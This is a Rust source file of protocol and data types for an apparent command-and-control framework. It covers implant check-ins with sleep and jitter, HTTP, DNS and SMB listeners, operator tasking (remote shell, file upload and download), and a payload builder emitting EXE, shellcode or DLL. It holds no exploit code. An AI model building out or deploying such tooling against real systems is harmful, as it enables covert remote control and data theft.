use serde::{Deserialize, Serialize};
use uuid::Uuid;
use chrono::{DateTime, Utc};

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct AgentInfo {
    pub id: Uuid,
    pub hostname: String,
    pub username: String,
    pub os_version: String,
    pub arch: String,
    pub pid: u32,
    pub elevated: bool,
    pub last_seen: DateTime<Utc>,
    pub listener_id: Uuid,
    pub sleep_ms: u64,
    pub jitter_pct: u8,
    pub build_id: String,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct ListenerConfig {
    pub id: Uuid,
    pub name: String,
    pub protocol: ListenerProtocol,
    pub host: String,
    pub port: u16,
    pub active: bool,
    // DNS-specific
    pub dns_domain: Option<String>,
    // SMB-specific
    pub pipe_name: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Copy)]
#[serde(rename_all = "lowercase")]
pub enum ListenerProtocol {
    Http,
    Https,
    Dns,
    Smb,
}

impl std::fmt::Display for ListenerProtocol {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Http  => write!(f, "HTTP"),
            Self::Https => write!(f, "HTTPS"),
            Self::Dns   => write!(f, "DNS"),
            Self::Smb   => write!(f, "SMB"),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct Task {
    pub id: Uuid,
    pub agent_id: Uuid,
    pub operator: String,
    pub command: TaskCommand,
    pub status: TaskStatus,
    pub output: Option<String>,
    pub created_at: DateTime<Utc>,
    pub completed_at: Option<DateTime<Utc>>,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(tag = "type", rename_all = "snake_case")]
pub enum TaskCommand {
    Shell   { cmd: String },
    Upload  { path: String, data: Vec<u8> },
    Download { path: String },
    Sleep   { ms: u64, jitter: u8 },
    Pwd,
    Ls      { path: String },
    Ps,
    Whoami,
    Exit,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "lowercase")]
pub enum TaskStatus {
    Pending,
    Running,
    Completed,
    Failed,
}

impl std::fmt::Display for TaskStatus {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Pending   => write!(f, "pending"),
            Self::Running   => write!(f, "running"),
            Self::Completed => write!(f, "completed"),
            Self::Failed    => write!(f, "failed"),
        }
    }
}

// ── Operator ↔ Team-server WebSocket protocol ───────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "type", rename_all = "snake_case")]
pub enum OperatorMsg {
    // Auth
    Auth        { password: String },
    AuthOk      { operator_id: Uuid, server_name: String },
    AuthFail    { reason: String },

    // Listener management
    StartListener  { config: ListenerConfig },
    StopListener   { id: Uuid },
    ListListeners,
    ListenerStarted { config: ListenerConfig },
    ListenerStopped { id: Uuid },
    ListenerError   { id: Uuid, reason: String },
    ListenerList    { listeners: Vec<ListenerConfig> },

    // Agent management
    ListAgents,
    AgentList   { agents: Vec<AgentInfo> },
    AgentCheckin { agent: AgentInfo },
    AgentRemoved { id: Uuid },

    // Tasking
    TaskAgent   { task: Task },
    TaskResult  { task: Task },

    // Build
    BuildPayload { config: BuildConfig },
    BuildReady   { build_id: String, bytes: Vec<u8>, format: PayloadFormat },
    BuildError   { reason: String },

    // Server events
    OperatorJoined  { name: String },
    OperatorLeft    { name: String },
    ServerShutdown,
    Error           { message: String },
}

// ── Agent ↔ Team-server HTTP/DNS/SMB protocol ────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentCheckinReq {
    pub agent_id:  Uuid,
    pub info:      AgentInfo,
    pub encrypted: Vec<u8>, // AES-GCM({ session_key }) with server pubkey
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentCheckinResp {
    pub tasks:      Vec<Task>,
    pub sleep_ms:   u64,
    pub jitter_pct: u8,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TaskResultReq {
    pub task_id:  Uuid,
    pub agent_id: Uuid,
    pub output:   String,
    pub success:  bool,
}

// ── Build configuration ───────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BuildConfig {
    pub listener_id:   Uuid,
    pub c2_host:       String,
    pub c2_port:       u16,
    pub protocol:      ListenerProtocol,
    pub sleep_ms:      u64,
    pub jitter_pct:    u8,
    pub format:        PayloadFormat,
    pub output_path:   Option<String>,
    // DNS-specific
    pub dns_domain:    Option<String>,
    // SMB-specific
    pub pipe_name:     Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum PayloadFormat {
    Exe,
    Shellcode,
    Dll,
}

impl std::fmt::Display for PayloadFormat {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Exe       => write!(f, "EXE"),
            Self::Shellcode => write!(f, "Shellcode"),
            Self::Dll       => write!(f, "DLL"),
        }
    }
}
